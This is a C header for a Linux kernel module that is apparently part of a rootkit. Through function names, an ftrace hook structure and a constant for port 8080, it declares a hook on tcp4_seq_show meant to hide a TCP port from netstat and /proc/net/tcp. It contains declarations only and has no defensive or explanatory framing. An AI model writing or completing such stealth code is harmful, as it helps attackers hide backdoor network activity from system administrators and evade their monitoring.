#ifndef HIDE_PROC_NET_H
#define HIDE_PROC_NET_H
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/ptrace.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/seq_file.h>
#include <linux/namei.h>
#include <linux/ftrace.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/linkage.h>
#include <linux/tcp.h>
#define PORT_HIDE 0x1f90
#define USE_FENTRY_OFFSET 0

static asmlinkage long (*org_tcp4_seq_show)(struct seq_file* seq, void* v);
static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v);
static int netstat_hide(void);
static void netstat_unhide(void);

struct ftrace_hook {
	const char* name;
	void* function;
	void* original;

	unsigned long addr;
	struct ftrace_ops ops;
};

#endif